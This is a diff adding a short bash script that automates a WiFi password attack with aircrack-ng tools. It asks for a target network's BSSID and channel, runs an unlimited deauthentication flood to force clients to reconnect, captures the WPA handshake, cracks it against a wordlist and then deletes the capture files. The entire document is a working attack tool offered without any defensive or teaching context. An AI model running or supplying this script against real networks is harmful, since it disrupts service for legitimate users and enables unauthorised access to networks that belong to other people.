@@ -1,0 +1,24 @@
+#!/bin/bash
+clear
+airmon-ng start wlan0
+airodump-ng mon0 &
+sleep 5
+killall airodump-ng
+
+sleep 3
+echo "Enter BSSID to target"
+read bssid
+echo "Enter Channel"
+read channel
+gnome-terminal -e "airodump-ng -w ./crackcap/capture --bssid $bssid --channel $channel mon0"
+
+sleep 3
+aireplay-ng --deauth 0 -a $bssid mon0 &
+sleep 20
+killall aireplay-ng
+
+aircrack-ng ./crackcap/capture-01.cap -w ./dict/elitehacker.txt
+
+sleep 20
+rm ./crackcap/capture-01.*
+airmon-ng stop mon0
